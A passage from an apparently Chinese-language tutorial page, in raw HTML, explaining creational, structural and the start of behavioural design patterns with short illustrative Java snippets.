class_">Factory</span>&#123;</span><br><span class="line">    <span class="comment">//创建窗口</span></span><br><span class="line">    Window <span class="title function_">createWindow</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">//创建按钮</span></span><br><span class="line">    Button <span class="title function_">createButton</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生产某种风格A对象的工厂</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FactoryA</span> <span class="keyword">implements</span> <span class="title class_">Factory</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Window <span class="title function_">createWindow</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WindowA</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Button <span class="title function_">createButton</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ButtonA</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Factory</span> <span class="variable">facory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FactoryA</span>();</span><br><span class="line"><span class="type">Window</span> <span class="variable">window</span> <span class="operator">=</span> factory.createWindow();</span><br><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> factory.createButton();</span><br></pre></td></tr></table></figure>

<h2 id="4-原型模式（Prototype）"><a href="#4-原型模式（Prototype）" class="headerlink" title="4. 原型模式（Prototype）"></a>4. 原型模式（Prototype）</h2><blockquote>
<p>「对象可以自身复制出新的对象」</p>
</blockquote>
<p>适用场景：创建的对象很多属性都差不多，只需要在其他对象上修改一小部分。很多编程语言支持这种方式创建对象，比如java中每个对象都有clone()方法，那么在这样的语言里，不用专门写这种设计模式、利用自带方法即可。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="comment">//复制自己的实例</span></span><br><span class="line">    A <span class="title function_">clone</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line"><span class="type">A</span> <span class="variable">b</span> <span class="operator">=</span> a.clone();</span><br><span class="line"><span class="comment">//下面b可修改一些属性，成为一个新的对象</span></span><br></pre></td></tr></table></figure>

<h2 id="5-建造者模式（Builder）"><a href="#5-建造者模式（Builder）" class="headerlink" title="5. 建造者模式（Builder）"></a>5. 建造者模式（Builder）</h2><blockquote>
<p>对象的创建其实是一个非常复杂的过程，可能需要先创建一些零件，最后再把这些零件组装起来，建造者模式把组装这个行为分离出来，使得相同的零件，可以用不同的组装方法。</p>
</blockquote>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*创建一个个零件类*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假设A、B是零件的接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Builder</span>&#123;</span><br><span class="line">    A <span class="title function_">createA</span><span class="params">()</span>;</span><br><span class="line">    B <span class="title function_">createB</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义零件组装过程</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Director</span>&#123;</span><br><span class="line">    Builder builder;</span><br><span class="line">    </span><br><span class="line">    Director(Builder builder)&#123;</span><br><span class="line">        <span class="built_in">this</span>.builder = builder;    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">assembly</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> builder.createA();</span><br><span class="line">        <span class="type">B</span> <span class="variable">b</span> <span class="operator">=</span> builder.createB();</span><br><span class="line">        <span class="comment">//下面就是根据某种方法，将a和b组装起来</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Builder</span>();</span><br><span class="line"><span class="type">Director</span> <span class="variable">director</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Director</span>(builder);</span><br><span class="line">director.assembly();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说明</p>
</blockquote>
<p>这里的Builder和Director完全可以定义成接口，利用前面讲的工厂方法等来提供，也就是说设计模式之间是可以组合使用的，最终可以使得客户端中不存在new这种显示创建对象的方法。</p>
<blockquote>
<p>小结</p>
</blockquote>
<ul>
<li>创建型模式是设计模式的基础，只有把这个问题解决了，上层模块才能完全对接口进行编程，想要哪个对象，直接调用某个创建型模式对象的方法就可以了。细心看上面的例子可以发现：尽管业务对象可以通过工厂类对象等创建，没有显示出现new关键字，但是工厂类对象本身却出现了new关键字</li>
<li>有&#x3D;&#x3D;两种方法可以彻底消灭new&#x3D;&#x3D;：<ol>
<li>把创建这些工厂类的代码聚集到一起，使变化局限于局部；</li>
<li>java中有“反射”机制，可以把创建工厂类的方式通过配置文件来提供，这样就完全避免了修改代码，完全避免了代码中出现new，这是最佳的解决方案：即工厂对象由配置文件创建，业务对象由工厂对象创建。很多框架，例如&#x3D;&#x3D;Spring&#x3D;&#x3D;，就是采取这种方式来提供对象，它有个时髦的名字叫做“&#x3D;&#x3D;依赖注入&#x3D;&#x3D;”。</li>
</ol>
</li>
</ul>
<h1 id="二、结构模式"><a href="#二、结构模式" class="headerlink" title="二、结构模式"></a>二、结构模式</h1><blockquote>
<p>「适配器、桥接、组合、装饰、外观、享元、代理」</p>
</blockquote>
<p>结构型模式最能体现设计的精妙，从中可以学到不少智慧。针对特定的问题，这些模式的解决思路很有借鉴启发的作用。</p>
<h2 id="1-适配器（Adapter）"><a href="#1-适配器（Adapter）" class="headerlink" title="1. 适配器（Adapter）"></a>1. 适配器（Adapter）</h2><blockquote>
<p>「转接口」</p>
</blockquote>
<p>适用于这样的情况：用户（或者高层业务逻辑）需要一种接口来调用某种功能，手头已经有能够实现这种功能的类，但是接口与用户需要的不一致，这时候就可以创建一个类似于“转接口”的类使得用户接口和已有库的接口能够对接，而不是仅仅因为接口不一致而重新开发。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//客户想要的接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span>&#123; <span class="keyword">void</span> <span class="title function_">function</span><span class="params">()</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//已经存在的接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Old</span>&#123; <span class="keyword">void</span> <span class="title function_">func</span><span class="params">()</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设计一个适配器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Adapter</span> <span class="keyword">implements</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    Old o;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    function()&#123;</span><br><span class="line">        o.func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Adapter</span>();</span><br><span class="line">a.function();</span><br><span class="line"><span class="comment">//对于客户来说，它并不知道，也没有必要知道这期间是否进行了转接，能用就行</span></span><br></pre></td></tr></table></figure>

<h2 id="2-桥接（Bridge）"><a href="#2-桥接（Bridge）" class="headerlink" title="2. 桥接（Bridge）"></a>2. 桥接（Bridge）</h2><blockquote>
<p>「解决类多方向发展带来的结构僵化问题」</p>
</blockquote>
<p>桥接模式是相对比较晦涩的一个，它并不是明显针对某个问题，我觉得他的思想更重要。假设有这样的情形：一开始需要设计一个运行在PC上软件，能够显示文本和图像，则可以设计一个接口：interface Software { void show(); }，以及两个子类：class TextSoftware implements Software{}，class ImageSoftware implements Software{}，这个时候结构并没有什么问题；下面又有了新需求，把这个功能移植到手机上，那么有人可能会这样设计：TextSoftware做两个子类：TextSoftware4Pc和TextSoftware4Phone，ImageSoftware也做两个子类：ImageSoftware4Pc，ImageSoftware4Phone，这样貌似也能解决问题，但是这会带来僵化问题：如果现在又有了新的需求，定制两个Software版本，一个为成人的，一个为儿童的，当然也要既有Pc的，也有手机的，那么在上面的基础上继续继承的话，可以这么做：TextSoftware4Pc下面派生两个子类TextSoftware4PcAdult和TextSoftware4PcChildren，TextSoftware4Phone派生两个子类TextSoftware4PhoneAdult和TextSoftware4PhoneChildren,ImageSoftware4Pc派生两个子类ImageSoftware4PcAdult和ImageSoftware4PcChildren,ImageSoftware4Phone派生两个子类ImageSoftware4PhoneAdult和ImageSoftware4PhoneChildren。从这里应该就可以隐约感觉到，这种基于继承的结构，已经开始存在危机了，如果再增加新的需求，这个类继承层次就会非常的复杂，给软件以后维护带来很大的难度。分析下需求的变化可以看到，需求同时朝着三个方向变化：1.文本显示功能和图像显示功能；2.Pc平台和手机平台；3.成人版本和儿童版本；这三个方向的高层逻辑变化各自是独立的，彼此之间并没有先后继承关系，只是在最后整合的时候才会关联。桥接模式就是针对这种一个类同时朝着几个方向发展的结构问题，它根据每个变化方向设计一个接口，分别演化，各方向之间通过组合的方式结合在一起，这样的结构就清晰多了。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//软件功能</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Software</span>&#123; <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TextSoftwareimplements</span> Software&#123;</span><br><span class="line">    <span class="meta">@Overrride</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ImageSoftware</span> <span class="keyword">implements</span> <span class="title class_">Software</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用群体</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">User</span>&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdultUser</span> <span class="keyword">implements</span> <span class="title class_">User</span>&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChildrenUser</span> <span class="keyword">implements</span> <span class="title class_">User</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//平台</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Platform</span>&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PcPlatform</span> <span class="keyword">implements</span> <span class="title class_">Platform</span>&#123;</span><br><span class="line">    Software soft;</span><br><span class="line">    User user;</span><br><span class="line">    <span class="comment">//下面可以自己组合这些业务元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意</p>
</blockquote>
<p>我这里是以平台为基准进行组合，也可以以使用群体为基准进行组合，或者说组合的方式是灵活的，可以很容易变化。每个变化方向之间通过“组合”的方式，类似于在各个方向之间建立了一座桥梁，故这个模式叫做桥接模式。这个模式的意义在于：它说明了&#x3D;&#x3D;继承的劣势&#x3D;&#x3D;，&#x3D;&#x3D;组合的优势&#x3D;&#x3D;，实际上，每一个类都需要在其他类的基础上进行工作，有时候需要进行功能方面的继承，有时候需要进行结构方面的继承，正确的方式应该是：继承用于功能继承，组合用于结构继承，即继承是为了使用父类中的方法和字段，省的子类再重复地写，而组合是为了使用父类的结构，好像零件的组装，把一个个零件做好了之后装在一起，然后又可以拆卸，而不是一股脑把所有零件浇筑在一起。所谓组合优于继承，就是指这个。</p>
<h2 id="3-组合（Composite）"><a href="#3-组合（Composite）" class="headerlink" title="3. 组合（Composite）"></a>3. 组合（Composite）</h2><blockquote>
<p>「表示具有层次关系的一类结构」</p>
</blockquote>
<p>组合模式相对来说好理解一些，数据结构中的树就是典型的组合模式，树的每一个结点都可以包含另一些结点</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//结点接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node n)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Node n)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//叶子结点</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Leaf</span> <span class="keyword">implements</span> <span class="title class_">Node</span>()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node n)</span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Node n)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非叶子结点</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stem</span> <span class="keyword">implements</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List list;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">        list.add(n);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">        list.remove(n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Node</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stem</span>();</span><br><span class="line"><span class="type">Node</span> <span class="variable">oneStem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stem</span>();</span><br><span class="line"><span class="type">Node</span> <span class="variable">leaf1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Leaf</span>();</span><br><span class="line"><span class="type">Node</span> <span class="variable">leaf2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Leaf</span>();</span><br><span class="line"><span class="type">Node</span> <span class="variable">leaf3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Leaf</span>();</span><br><span class="line">oneStem.add(leaf1);</span><br><span class="line">oneStem.add(leaf2);</span><br><span class="line">root.add(oneStem);</span><br><span class="line">root.add(leaf3);</span><br></pre></td></tr></table></figure>

<h2 id="4-装饰（Decorator）"><a href="#4-装饰（Decorator）" class="headerlink" title="4. 装饰（Decorator）"></a>4. 装饰（Decorator）</h2><blockquote>
<p>「给子类方便地添加一些功能」</p>
</blockquote>
<p>适用于这种情况：一个类要添加一点点功能，这种功能可以动态地随时添加，随时删除，这时候就不能用派生子类的方法，因为一旦派生一个子类，里面的结构就是静态的，而且本身也不鼓励使用继承。比如说有了一个窗口类，现在仅仅是要给这个窗口加个边框，或者换一个边框，但不能改变窗口类的接口，也就是说，加或者没加边框，用户看起来都是同一个接口。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//窗口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Window</span>&#123; <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>; &#125;</span><br><span class="line"><span class="comment">//具体的一个窗口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AWindow</span> inplements Window&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一个装饰类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Decorator</span> <span class="keyword">implements</span> <span class="title class_">Window</span>&#123;</span><br><span class="line">    <span class="comment">// 包含一个窗口</span></span><br><span class="line">    Window win;</span><br><span class="line">    <span class="comment">//区别代理模式：往往被装饰的对象由构造器传入，而代理模式则完全隐藏内部对象的构造过程</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Decorator</span><span class="params">(Window win)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.win = win;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//先加一个边框</span></span><br><span class="line">        addBorder();</span><br><span class="line">        <span class="comment">//展示本来win里面的内容</span></span><br><span class="line">        win.display();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addBorder</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Window</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Decorator</span>(); <span class="comment">//这里不考虑怎么给内部win对象的赋值，这个属于创建型模式需要解决的问题，下同</span></span><br><span class="line">a.display();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意</p>
</blockquote>
<p>从这里可以看到，a对象根本没觉察到赋给它的那个对象是原始对象还是装饰过的，反正接口是一样的。装饰模式在java库里有很多应用，比如说io包里的各个输入输出流都是包装过的，采用了装饰模式。这里的“装饰”可以有很多应用场景，比如说j2ee里的Servlet类是用来处理客户端http请求的，那么我们实际上可以设计一个Servlet的装饰类，让它做一些前期处理，或者后期处理，这个概念类似于过滤器（但过滤器自身的前置和后置处理是采用了职责链模式[以后介绍]）。</p>
<h2 id="5-外观（Facade）"><a href="#5-外观（Facade）" class="headerlink" title="5. 外观（Facade）"></a>5. 外观（Facade）</h2><blockquote>
<p>「把一组功能集中起来，提供一个统一的接口」</p>
</blockquote>
<p>外观模式相对比较好理解，客户需要操作一组功能，需要牵涉到好几个类或者接口，那么我们可以把这些接口集中起来，通过一个类来向用户提供。这个模式的更大意义是，这个外观类可以更好地组织那些功能，以更好的方式提供给客户。</p>
<p>比如说需要构建一个软件，构建是一个系统工程，需要进行预处理、编译、链接、部署等等，但对于客户来说，他可以亲自动手一步步做，也可以交给一个构建程序（比如make）来做，他只要调用基本的命令（make）就行，以后的任务交给make来做，而且make做的比他本人一步步做可能效果更好</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//预处理</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Prepare</span>&#123; <span class="keyword">void</span> <span class="title function_">doPrepare</span><span class="params">()</span>; &#125;</span><br><span class="line"><span class="comment">//编译</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Compile</span>&#123; <span class="keyword">void</span> <span class="title function_">doCompile</span><span class="params">()</span>; &#125;</span><br><span class="line"><span class="comment">//链接</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Link</span>&#123; <span class="keyword">void</span> <span class="title function_">doLink</span><span class="params">()</span>; &#125;</span><br><span class="line"><span class="comment">//清除</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Remove</span>&#123; <span class="keyword">void</span> <span class="title function_">doRemove</span><span class="params">()</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//外观类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Facade</span>&#123;</span><br><span class="line">    Prepare p;</span><br><span class="line">    Compile c;</span><br><span class="line">    Link l;</span><br><span class="line">    Remove r;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">build</span><span class="params">()</span>&#123;</span><br><span class="line">        p.doPrepare();</span><br><span class="line">        c.doCompile();</span><br><span class="line">        l.doLink();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span>&#123;</span><br><span class="line">        r.doRemove();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Facade</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Facade</span>();</span><br><span class="line"><span class="comment">//构建软件</span></span><br><span class="line">f.build();</span><br><span class="line"><span class="comment">//清除软件</span></span><br><span class="line">f.remove();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意</p>
</blockquote>
<p>Facade类与各个功能类之间是组合关系，是松耦合的，很容易变化</p>
<h2 id="6-享元（Flyweight）"><a href="#6-享元（Flyweight）" class="headerlink" title="6. 享元（Flyweight）"></a>6. 享元（Flyweight）</h2><blockquote>
<p>「有效解决使用大量重复的小对象的问题」</p>
</blockquote>
<p>享元模式适用于这种情况：比如说设计一个文档编辑器，里面的基本对象是字符，简单的想法是每个字符为一个对象，存储字符的值以及放置的位置。这样似乎解决了问题，但是还是有可以优化的地方：一篇文档中存在大量相同的字符，相对应的这些字符对象仅仅是位置不同，这里似乎可以用“共享”的方式：如果遇到一个字符，先看这个字符对象是不是存在，不存在就创建，如果已经存在了，就使用这个对象，修改一下位置的值，然后画出这个字符。</p>
<p>具体在实现享元模式时，可以指定对象是否可以共享，如果不能共享，就每次都创建新对象。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//字符接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Character</span>&#123;&#125;</span><br><span class="line"><span class="comment">//两类字符对象：可以共享的；不可以共享的</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ShareCharacter</span> <span class="keyword">implements</span> <span class="title class_">Character</span>&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnshareCharacter</span> <span class="keyword">implements</span> <span class="title class_">Character</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建享元对象的工厂</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CharacterFactory</span>&#123;</span><br><span class="line">    Character <span class="title function_">getChar</span><span class="params">(<span class="type">char</span> c)</span>&#123;</span><br><span class="line">        Character c;</span><br><span class="line">        <span class="comment">//根据某些条件判断，是共享一个对象，还是生产一个新的对象</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Character</span> <span class="variable">ch</span> <span class="operator">=</span> CharacterFactory.getChar(<span class="string">&#x27;a&#x27;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意</p>
</blockquote>
<p>这里客户端只是调用工厂方法来生产字符对象，但并不知道这个字符是新创建的对象，还是已经存在的对象</p>
<h2 id="7-代理模式（Proxy）"><a href="#7-代理模式（Proxy）" class="headerlink" title="7. 代理模式（Proxy）"></a>7. 代理模式（Proxy）</h2><blockquote>
<p>「控制对一个对象的访问」</p>
</blockquote>
<p>适用于这种情况：要访问一个对象，但又要做一些限制或者控制，或者不能直接访问到这个对象，好比网络服务中的代理服务器。那么可以在访问者和被访问者之间建立一个代理类，访问者向代理类发出请求，由代理类负责来访问。</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需要访问的对象接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Subject</span>&#123; <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span>; &#125;</span><br><span class="line"><span class="comment">//实际访问的类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RealSubject</span> <span class="keyword">implements</span> <span class="title class_">Subject</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代理类，提供相同的接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">Subject</span>&#123;</span><br><span class="line">    Subject real;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//做一些连接等准备工作</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//调用真正需要访问的类的功能</span></span><br><span class="line">        real.operation();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Subject</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>();</span><br><span class="line">obj.operation();</span><br></pre></td></tr></table></figure>

<h1 id="三、行为模式"><a href="#三、行为模式" class="headerlink" title="三、行为模式"></a>三、行为模式</h1><blockquote>
<p>「职责链、命令、解释器、迭代器、中介者、备忘录、观察者、状态、策略、模板方法、访问者」</p>
</blockquote>
<p>行为模式关注的是对象间的一些协作关系。</p>
<h2 id="1-职责链（Chain-Of-Responsibility）"><a href="#1-职责链（Chain-Of-Responsibility）" class="headerlink" title="1. 职责链（Chain Of Responsibility）"></a>1. 职责链（Chain Of Responsibility）</h2><blockquote>
<p>「任务的转发」</p>
</blockquote>
<p>适用于以下的场景：客户给出一个任务，但并不知道、也不想知道这个任务谁去执行，于是交给一个链实例，这个链实例会判断任务是否由其本身完成，如果不是，就转发给下一个实例，依次类推，直到有实例处理它或便利了所有的链实例都询问完成</p>
<p>网络中的数据包传递，就是这个原理，比如我要把一个消息发到某一个ip，我其实并不需要直到这个ip究竟在哪里，只要发给路由器，路由器判断这个数据包是否属于我管的这个范围，如果是就收下来，转发给下面的子网，如果不是就转发给另一个路由器；子网里面也是这个工作方式，数据包被一站一站地转发，直到最后到达目标ip的计算机。</p>
<p>更为贴切web开发的例子是web开发中的过滤器，FilterChain和chain.doFilter这样的特征代码就是典型的职责链模式</p>
<p>另一个例子是阿里的Druid数据库连接池，使用该模式对JDBC做了扩展</p>
<ul>
<li>设计</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//操作总接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Handler</span>&#123;</span><br><span class="line">  <span class="comment">//转发</span></span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">transfer</span><span class="params">(Handler next)</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//处理消息</span></span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//具体类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HandlerA</span> impleements Handler&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transfer</span><span class="params">(Handler next)</span>&#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//先判断是否由自己来处理</span></span><br><span class="line">    <span class="keyword">if</span>(isMyDuty)&#123;</span><br><span class="line">      doSomething(); </span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="comment">//如果不是，则转发</span></span><br><span class="line">      transfer();</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Handler</span> <span class="variable">start</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HandlerA</span>();</span><br><span class="line">start.operation();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意</p>
</blockquote>
